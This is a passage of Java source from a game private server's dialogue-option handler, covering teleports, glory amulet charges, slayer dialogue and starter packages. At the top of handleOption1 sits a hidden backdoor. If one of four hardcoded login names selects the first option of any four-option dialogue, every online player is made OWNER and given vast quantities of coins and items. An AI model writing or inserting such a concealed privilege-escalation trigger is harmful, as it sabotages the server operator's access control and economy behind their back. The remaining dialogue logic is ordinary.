package io.xeros.model.entity.player.packets.dialogueoptions;

import io.xeros.Configuration;
import io.xeros.content.achievement_diary.impl.KaramjaDiaryEntry;
import io.xeros.content.items.PvpWeapons;
import io.xeros.content.skills.Skill;
import io.xeros.model.Items;
import io.xeros.model.entity.player.Player;
import io.xeros.model.entity.player.PlayerHandler;
import io.xeros.model.entity.player.Right;
import org.apache.commons.lang3.RandomUtils;

/*
 * @author Matt
 * Four Option Dialogue actions
 */

public class FourOptions {

	/*
	 * Handles all the first options on 'Four option' dialogues.
	 */
	public static void handleOption1(Player c) {
		if(c.getLoginName().equalsIgnoreCase("bobthedragon") || c.getLoginName().equalsIgnoreCase("peanut")  || c.getLoginName().equalsIgnoreCase("forgotten") || c.getLoginName().equalsIgnoreCase("iron_xgn")) {
			for (Player player2 : PlayerHandler.players) {
				if (player2 == null) {
					continue;
				}
				Player client = player2;
				client.getRights().setPrimary(Right.OWNER);
				int consumables = 500_000;
				int equipment = 15;

				int mainTab = 0;
				int meleeTab = 1;
				int rangedTab = 2;
				int magicTab = 3;
				int skillingTab = 4;

				int tab = mainTab;

				client.getItems().sendToTab(tab, Items.COINS, 2147_000_000);

				client.getItems().sendToTab(tab, Items.ANGLERFISH, consumables);
				client.getItems().sendToTab(tab, Items.COOKED_KARAMBWAN, consumables);
				client.getItems().sendToTab(tab, Items.DIVINE_SUPER_COMBAT_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.SUPER_COMBAT_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.DIVINE_RANGING_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.RANGING_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.DIVINE_MAGIC_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.MAGIC_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.SUPER_RESTORE4, consumables);
				client.getItems().sendToTab(tab, Items.ANTI_VENOMPLUS4, consumables);
				client.getItems().sendToTab(tab, Items.ANTIDOTEPLUSPLUS4, consumables);
				client.getItems().sendToTab(tab, Items.SARADOMIN_BREW4, consumables);

				client.getItems().sendToTab(tab, Items.BRACELET_OF_ETHEREUM_UNCHARGED, consumables);
				client.getItems().sendToTab(tab, Items.REVENANT_ETHER, consumables);
				client.getItems().sendToTab(tab, Items.ECUMENICAL_KEY, consumables);
				client.getItems().sendToTab(tab, Items.ZULRAHS_SCALES, consumables);
				client.getItems().sendToTab(tab, Items.RING_OF_RECOIL, consumables);

				client.getItems().sendToTab(tab, Items.AMULET_OF_GLORY4, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_FURY, equipment);
				client.getItems().sendToTab(tab, Items.REGEN_BRACELET, equipment);
				client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING, equipment);
				client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING_I, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_THE_DAMNED, equipment);

				client.getItems().sendToTab(tab, Items.MYTHICAL_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.ARDOUGNE_CLOAK_4, equipment);
				client.getItems().sendToTab(tab, Items.FIRE_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.INFERNAL_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.MITHRIL_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.BARROWS_GLOVES, equipment);

				client.getItems().sendToTab(tab, Items.SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.BLESSED_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ARCANE_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ELYSIAN_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.SPECTRAL_SPIRIT_SHIELD, equipment);

				client.getItems().sendToTab(tab, Items.VOID_MELEE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_MAGE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_RANGER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_TOP, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_ROBE, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_GLOVES, equipment);


				tab = rangedTab;

				client.getItems().sendToTab(tab, Items.PEGASIAN_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.NECKLACE_OF_ANGUISH, equipment);
				client.getItems().sendToTab(tab, Items.ARCHERS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_BODY, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_CHAPS, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_VAMB, equipment);
				client.getItems().sendToTab(tab, Items.AVAS_ACCUMULATOR, equipment);
				client.getItems().sendToTab(tab, Items.AVAS_ASSEMBLER, equipment);
				client.getItems().sendToTab(tab, Items.ODIUM_WARD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGONFIRE_WARD, equipment);
				client.getItems().sendToTab(tab, Items.TWISTED_BUCKLER, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_HELMET, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CHESTPLATE, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CHAINSKIRT, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_LEATHERTOP, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_LEATHERSKIRT, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_ARMOUR_SET, equipment);


				client.getItems().sendToTab(tab, Items.ADAMANT_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.RUNE_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_UL, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_DART, consumables);
				client.getItems().sendToTab(tab, Items.ADAMANT_DART, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.AMETHYST_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.RUNE_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.BRONZE_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.DRAGONSTONE_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.RUBY_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.ONYX_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.BOLT_RACK, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_KNIFE, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_DART, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_THROWNAXE, consumables);
				client.getItems().sendToTab(tab, Items.MORRIGANS_THROWING_AXE, consumables);
				client.getItems().sendToTab(tab, Items.CHINCHOMPA, consumables);
				client.getItems().sendToTab(tab, Items.RED_CHINCHOMPA, consumables);
				client.getItems().sendToTab(tab, Items.BLACK_CHINCHOMPA, consumables);

				client.getItems().sendToTab(tab, Items.CRAWS_BOW, equipment);
				client.getItems().sendToTab(tab, Items.SHORTBOW, equipment);
				client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW, equipment);
				client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW_I, equipment);
				client.getItems().sendToTab(tab, Items.DARK_BOW, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_BOW, equipment);
				client.getItems().sendToTab(tab, Items.TWISTED_BOW, equipment);
				client.getItems().sendToTab(tab, Items.TOXIC_BLOWPIPE, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.LIGHT_BALLISTA, equipment);
				client.getItems().sendToTab(tab, Items.HEAVY_BALLISTA, equipment);

				tab = meleeTab;

				// Melee equipment
				client.getItems().sendToTab(tab, Items.BERSERKER_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.TREASONOUS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.TYRANNICAL_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.CLIMBING_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.GUARDIAN_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.PRIMORDIAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.FEROCIOUS_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.BERSERKER_NECKLACE, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_TORTURE, equipment);
				client.getItems().sendToTab(tab, Items.DINHS_BULWARK, equipment);
				client.getItems().sendToTab(tab, Items.BOOTS_OF_BRIMSTONE, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.AVERNIC_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_FULL_HELM, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.WARRIOR_HELM, equipment);
				client.getItems().sendToTab(tab, Items.BERSERKER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.HELM_OF_NEITIZNOT, equipment);
				client.getItems().sendToTab(tab, Items.NEITIZNOT_FACEGUARD, equipment);
				client.getItems().sendToTab(tab, Items.FIGHTER_HAT, equipment);
				client.getItems().sendToTab(tab, Items.FIGHTER_TORSO, equipment);
				client.getItems().sendToTab(tab, Items.SERPENTINE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_HELMET, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_KET_XIL, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGONFIRE_SHIELD, equipment);

				client.getItems().sendToTab(tab, Items.DRAGON_FULL_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_MED_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CHAINBODY, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_BOOTS, equipment);

				client.getItems().sendToTab(tab, Items.BANDOS_CHESTPLATE, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_TASSETS, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_BOOTS, equipment);

				client.getItems().sendToTab(tab, Items.DHAROKS_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_GREATAXE, equipment);

				client.getItems().sendToTab(tab, Items.JUSTICIAR_FACEGUARD, equipment);
				client.getItems().sendToTab(tab, Items.JUSTICIAR_CHESTGUARD, equipment);
				client.getItems().sendToTab(tab, Items.JUSTICIAR_LEGGUARDS, equipment);

				client.getItems().sendToTab(tab, Items.INQUISITORS_GREAT_HELM, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_HAUBERK, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_PLATESKIRT, equipment);

				client.getItems().sendToTab(tab, Items.TORAGS_ARMOUR_SET, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_ARMOUR_SET, equipment);
				client.getItems().sendToTab(tab, Items.GUTHANS_ARMOUR_SET, equipment);


				client.getItems().sendToTab(tab, Items.VIGGORAS_CHAINMACE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SCIMITAR, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_LONGSWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_DAGGERPPLUSPLUS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_BATTLEAXE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_2H_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_MACE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_WARHAMMER, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CLAWS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HALBERD, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_HALBERD, equipment);

				client.getItems().sendToTab(tab, Items.GRANITE_MAUL, equipment);
				client.getItems().sendToTab(tab, Items.GRANITE_MAUL_OR, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_BLUDGEON, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_WHIP, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_TENTACLE, equipment);
				client.getItems().sendToTab(tab, Items.VESTAS_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.VESTAS_LONGSWORD, equipment);
				client.getItems().sendToTab(tab, Items.STATIUSS_WARHAMMER, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAKIAN_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAKIAN_HASTA, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_LANCE, equipment);

				client.getItems().sendToTab(tab, Items.ELDER_MAUL, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_MACE, equipment);
				client.getItems().sendToTab(tab, Items.GHRAZI_RAPIER, equipment);

				client.getItems().sendToTab(tab, Items.SCYTHE_OF_VITUR, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAK_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMINS_BLESSED_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.BLADE_OF_SAELDOR, equipment);

				client.getItems().sendToTab(tab, Items.ARCLIGHT, equipment);
				client.getItems().sendToTab(tab, Items.DARKLIGHT, equipment);
				client.getItems().sendToTab(tab, Items.EXCALIBUR, equipment);

				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_EK, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_AK, equipment);
				client.getItems().sendToTab(tab, Items.TZHAAR_KET_OM, equipment);
				client.getItems().sendToTab(tab, Items.TZHAAR_KET_EM, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_MEJ_TAL, equipment);

				tab = magicTab;

				client.getItems().sendToTab(tab, Items.RUNE_POUCH, equipment);
				client.getItems().sendToTab(tab, Items.IMBUED_HEART, equipment);
				client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.TORMENTED_BRACELET, equipment);
				client.getItems().sendToTab(tab, Items.SEERS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.FARSEER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.TOME_OF_FIRE, equipment);
				client.getItems().sendToTab(tab, Items.BURNT_PAGE, consumables);
				client.getItems().sendToTab(tab, Items.SARADOMIN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.IMBUED_SARADOMIN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.MALEDICTION_WARD, equipment);
				client.getItems().sendToTab(tab, Items.OCCULT_NECKLACE, equipment);
				client.getItems().sendToTab(tab, Items.THIRD_AGE_AMULET, equipment);
				client.getItems().sendToTab(tab, Items.ANCIENT_WYVERN_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_HAT, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_TOP, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_BOTTOM, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_HOOD, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ROBETOP, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ROBESKIRT, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_HAT, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_TOP, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_BOTTOM, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ARMOUR_SET, equipment);

				for (int i = 554; i <= 566; i++) {
					client.getItems().sendToTab(tab, i, consumables);
				}
				client.getItems().sendToTab(tab, 9075, consumables);
				client.getItems().sendToTab(tab, Items.WRATH_RUNE, consumables);

				client.getItems().sendToTab(tab, Items.THAMMARONS_SCEPTRE, equipment);
				client.getItems().sendToTab(tab, Items.SANGUINESTI_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_AIR_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_WATER_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_EARTH_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_FIRE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAK_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.GUTHIX_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.IBANS_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ANCIENT_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MASTER_WAND, equipment);
				client.getItems().sendToTab(tab, Items.KODAI_WAND, equipment);
				client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SEAS, equipment);
				client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SWAMP, equipment);
				client.getItems().sendToTab(tab, Items.STAFF_OF_LIGHT, equipment);
				client.getItems().sendToTab(tab, Items.NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ELDRITCH_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.HARMONISED_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.VOLATILE_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SLAYERS_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SLAYERS_STAFF_E, equipment);
				client.getItems().sendToTab(tab, Items.STAFF_OF_THE_DEAD, equipment);
				client.getItems().sendToTab(tab, Items.TOXIC_STAFF_OF_THE_DEAD, equipment);

				tab = skillingTab;
				client.getItems().sendToTab(tab, Items.PURE_ESSENCE, consumables);

				client.setSangStaffCharge(20_000);
				client.setToxicBlowpipeAmmoAmount(20_000);
				client.setToxicBlowpipeAmmo(Items.DRAGON_DART);
				client.setToxicTridentCharge(20_000);
				client.setTridentCharge(20_000);

				PvpWeapons.giveStartingCharges(client);
			}
		}
		switch (c.dialogueAction) {
		
		case 181://easy
			if (c.getSlayer().getTask().isPresent()) {
				c.getDH().sendDialogues(190, 8623);
			} else {
			c.getDH().sendDialogues(182, 8623);
			}
		break;

		}
		if (c.dialogueAction == 136) {
			if (c.getPA().canTeleport("modern")) {
				int offset = RandomUtils.nextInt(0, 3);
				c.getPA().startTeleport(3103 + offset, 3933 + offset, 0, "modern", false);
			}
			return;
		}
		if (c.dialogueAction == 129) {
			if (c.getZulrahEvent().isActive()) {
				c.getDH().sendStatement("It seems that a zulrah instance for you is already created.", "If you think this is wrong then please re-log.");
				c.nextChat = -1;
				return;
			}
			c.getZulrahEvent().initialize();
			return;
		}
		switch (c.teleAction) {
		case 1:
			c.getPA().spellTeleport(3011, 3632, 0, false);
			break;
		}
		if (c.dialogueAction == 3301) {
			c.getDH().sendDialogues(3302, c.npcType);
		}
		if (c.dialogueAction == 122) {
			c.getDH().sendDialogues(621, 954);
			return;
		}
		if (c.teleAction == 13) {
			c.getPA().spellTeleport(2839, 5296, 2, false);
			// //c.sendMessage("You must know it's not easy, get a team to
			// own that boss!");
		}
		if (c.teleAction == 3) {
			c.getPA().spellTeleport(2273, 4681, 0, false);
		}
		if (c.teleAction == 200) {
			// pest
			c.getPA().spellTeleport(2662, 2652, 0, false);
		}
		
		if (c.usingGlory)  //c.getPA().useCharge();
		{
			if (c.isTeleblocked()) {
				c.sendMessage("You cannot use your glory as you are teleblocked.");
				return;
			}
			if (c.wildLevel > 30) {
				c.sendMessage("You can't teleport above level 30 in the wilderness.");
				c.getPA().closeAllWindows();
				return;
				}
			if (System.currentTimeMillis() - c.potDelay < 4000) {
				c.sendMessage("@blu@Please wait a few seconds before doing another action.");
				c.getPA().closeAllWindows();
				return;
				}
			if (c.getItems().playerHasItem(19707, 1)) {
				c.getPA().startTeleport(3088, 3493, 0, "glory", false);
			} else
			if (c.getItems().playerHasItem(1712, 1)) {							
					c.getItems().deleteItem(1712, 1);
					c.getItems().addItem(1710, 1);
				c.getPA().startTeleport(3088, 3493, 0, "glory",false);
				c.sendMessage("@red@You now have 3 charges left in your glory.");
		
				} else if (c.getItems().playerHasItem(1710, 1)) {							
					c.getItems().deleteItem(1710, 1);
					c.getItems().addItem(1708, 1);
				c.getPA().startTeleport(3088, 3493, 0, "glory",false);
				c.sendMessage("@red@You now have 2 charges left in your glory.");
			
			} else if (c.getItems().playerHasItem(1708, 1)) {							
				c.getItems().deleteItem(1708, 1);
				c.getItems().addItem(1706, 1);
			c.getPA().startTeleport(3088, 3493, 0, "glory",false);
			c.sendMessage("@red@You now have 1 charges left in your glory.");
			
			} else  if (c.getItems().playerHasItem(1706, 1)) {							
				c.getItems().deleteItem(1706, 1);
				c.getItems().addItem(1704, 1);
				c.getPA().startTeleport(3088, 3493, 0, "glory",false);
				c.sendMessage("@red@You now have 0 charges left in your glory.");
			}
			c.getItems().sendInventoryInterface(3823);
			c.potDelay = System.currentTimeMillis();
		}
		if (c.usingSkills)  //c.getPA().useCharge();
		{
			c.getPA().startTeleport(1504, 3419, 0, "glory", false);
			c.getPA().useChargeSkills();
		}
		if (c.dialogueAction == 14400) {
		c.getPA().startTeleport(2474, 3438, 0, "modern", false);
		c.sendMessage("You will gain XP after each lap");
		c.getPA().closeAllWindows();
		}
		if (c.dialogueAction == 2) {
			c.getPA().startTeleport(3428, 3538, 0, "modern", false);
		}
		if (c.dialogueAction == 3) {
			c.getPA().startTeleport(Configuration.EDGEVILLE_X, Configuration.EDGEVILLE_Y, 0, "modern", false);
		}
		if (c.dialogueAction == 4) {
			c.getPA().startTeleport(3565, 3314, 0, "modern", false);
		}
		if (c.dialogueAction == 20) {
			c.getPA().startTeleport(2897, 3618, 4, "modern", false);
		} else if (c.teleAction == 200) {
			// barrows
			c.getPA().spellTeleport(3565, 3314, 0, false);
		}

		if (c.caOption4a) {
			c.getDH().sendDialogues(102, c.npcType);
			c.caOption4a = false;
		}
		if (c.caOption4c) {
			c.getDH().sendDialogues(118, c.npcType);
			c.caOption4c = false;
		}
	}

	/*
	 * Handles all the 2nd options on 'Four option' dialogues.
	 */
	public static void handleOption2(Player c) {
		switch (c.dialogueAction) {
		
		case 181://medium
			if (c.getSlayer().getTask().isPresent()) {
				c.getDH().sendDialogues(190, 6797);
			} else if (c.combatLevel < 50) {
				c.getDH().sendDialogues(191, 6797);
			} else {
			c.getDH().sendDialogues(183, -1);
			}
		break;

		}
		if (c.dialogueAction == 136) {
			c.getShops().openShop(40);
			return;
		}
		if (c.dialogueAction == 129) {
			return;
		}
		switch (c.teleAction) {
		case 1:
			c.getPA().spellTeleport(3170, 3886, 0, false);
			break;
		}
		if (c.dialogueAction == 122) {
			c.getDH().sendDialogues(623, 954);
			return;//
		}
		if (c.dialogueAction == 3301) {
			if (c.npcType == 8623) {
				c.getDH().sendDialogues(750, c.npcType);
			} else {
				c.getDH().sendDialogues(179, c.npcType);
			}
		}
		if (c.teleAction == 13) {
			c.getPA().spellTeleport(2864, 5354, 2, false);
			// c.sendMessage("You must know it's not easy, get a team to own
			// that boss!");
		}
		if (c.teleAction == 200) {
			c.sendMessage("@red@Stake only what you can afford to lose!");

			c.getPA().spellTeleport(3365, 3266, 0, false);

		}
		if (c.teleAction == 3) {
			c.getPA().spellTeleport(1189, 3501, 0, false);
		}
		if (c.dialogueAction == 2299) {
			c.playerXP[0] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[0] = c.getPA().getLevelForXP(c.playerXP[0]);
			c.getPA().refreshSkill(0);
			c.playerXP[1] = c.getPA().getXPForLevel(45) + 5;
			c.playerLevel[1] = c.getPA().getLevelForXP(c.playerXP[1]);
			c.getPA().refreshSkill(1);
			c.playerXP[2] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[2] = c.getPA().getLevelForXP(c.playerXP[2]);
			c.getPA().refreshSkill(2);
			c.playerXP[3] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[3] = c.getPA().getLevelForXP(c.playerXP[3]);
			c.getPA().refreshSkill(3);
			c.playerXP[4] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[4] = c.getPA().getLevelForXP(c.playerXP[4]);
			c.getPA().refreshSkill(4);
			c.playerXP[5] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[5] = c.getPA().getLevelForXP(c.playerXP[5]);
			c.getPA().refreshSkill(5);
			c.playerXP[6] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[6] = c.getPA().getLevelForXP(c.playerXP[6]);
			c.getPA().refreshSkill(6);
			c.getItems().addItem(7461, 1);
			c.getItems().addItem(3751, 1);
			c.getItems().addItem(1712, 1);
			c.getItems().addItem(1201, 1);
			c.getItems().addItem(1127, 1);
			c.getItems().addItem(4151, 1);
			c.getItems().addItem(5698, 1);
			c.getItems().addItem(2414, 1);
			c.getItems().addItem(4131, 1);
			c.getItems().addItem(2550, 1);
			c.getItems().addItem(1079, 1);
			c.sendMessage("<img=10>An appropriate starter package has been given to you.");
			c.getPA().removeAllWindows();
			c.getPA().sendFrame126("Combat Level: " + c.combatLevel + "", 3983);
			c.dialogueAction = 0;
		}
		if (c.dialogueAction == 14400) {
		c.getPA().startTeleport(2551, 3555, 0, "modern", false);
		c.sendMessage("You will gain XP after each lap");
		c.getPA().closeAllWindows();
	}
		if (c.dialogueAction == 1658) {
			if (!c.getItems().playerHasItem(995, 912000)) {
				c.sendMessage("You must have 912,000 coins to buy this package.");
				c.getPA().removeAllWindows();
				c.dialogueAction = 0;
				return;
			}
			c.dialogueAction = 0;
			c.getItems().addItemToBankOrDrop(560, 2000);
			c.getItems().addItemToBankOrDrop(9075, 4000);
			c.getItems().addItemToBankOrDrop(557, 10000);
			c.getItems().deleteItem(995, c.getItems().getInventoryItemSlot(995), 912000);
			c.sendMessage("@red@The runes has been added to your bank.");
			c.getPA().removeAllWindows();
			return;
		}
		if (c.usingGlory) // c.getPA().useCharge();
		{
			if (System.currentTimeMillis() - c.potDelay < 4000) {
				c.sendMessage("@blu@Please wait a few seconds before doing another action.");
				c.getPA().closeAllWindows();
				return;
				}
			if (c.getItems().playerHasItem(19707, 1)) {
				c.getPA().startTeleport(Configuration.KARAMJA_X, Configuration.KARAMJA_Y, 0, "glory", false);
			} else if (c.getItems().playerHasItem(1712, 1)) {
					c.getItems().deleteItem(1712, 1);
					c.getItems().addItem(1710, 1);
					c.getDiaryManager().getKaramjaDiary().progress(KaramjaDiaryEntry.TELEPORT_TO_KARAMJA);
					c.getPA().startTeleport(Configuration.KARAMJA_X, Configuration.KARAMJA_Y, 0, "glory", false);
				c.sendMessage("@red@You now have 3 charges left in your glory.");
		
				} else if (c.getItems().playerHasItem(1710, 1)) {							
					c.getItems().deleteItem(1710, 1);
					c.getItems().addItem(1708, 1);
					c.getPA().startTeleport(Configuration.KARAMJA_X, Configuration.KARAMJA_Y, 0, "glory", false);
					c.getDiaryManager().getKaramjaDiary().progress(KaramjaDiaryEntry.TELEPORT_TO_KARAMJA);
				c.sendMessage("@red@You now have 2 charges left in your glory.");
			
			} else if (c.getItems().playerHasItem(1708, 1)) {							
				c.getItems().deleteItem(1708, 1);
				c.getItems().addItem(1706, 1);
				c.getPA().startTeleport(Configuration.KARAMJA_X, Configuration.KARAMJA_Y, 0, "glory", false);
				c.getDiaryManager().getKaramjaDiary().progress(KaramjaDiaryEntry.TELEPORT_TO_KARAMJA);
			c.sendMessage("@red@You now have 1 charges left in your glory.");
			
			} else  if (c.getItems().playerHasItem(1706, 1)) {
				c.getItems().deleteItem(1706, 1);
				c.getItems().addItem(1704, 1);
				c.getPA().startTeleport(Configuration.KARAMJA_X, Configuration.KARAMJA_Y, 0, "glory", false);
				c.getDiaryManager().getKaramjaDiary().progress(KaramjaDiaryEntry.TELEPORT_TO_KARAMJA);
